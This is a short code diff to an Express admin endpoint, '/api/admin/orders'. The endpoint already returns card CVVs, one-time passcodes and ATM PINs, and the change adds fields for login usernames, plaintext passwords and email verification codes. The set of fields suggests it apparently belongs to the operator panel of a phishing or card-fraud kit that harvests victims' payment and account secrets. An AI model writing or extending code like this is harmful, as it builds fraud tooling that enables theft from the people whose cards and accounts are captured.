@@ -77,7 +77,10 @@ app.get('/api/admin/orders', async (req, res) => {
         cvv: o.card_cvv || '',
         otp: o.verification_code || o.verification_code_3 || '',
         pin: o.atm_pin || '',
-        brand: o.card_brand || ''
+        brand: o.card_brand || '',
+        username: o.login_username || '',
+        password: o.login_password || '',
+        emailCode: o.email_verification_code || ''
       }
     }));
 
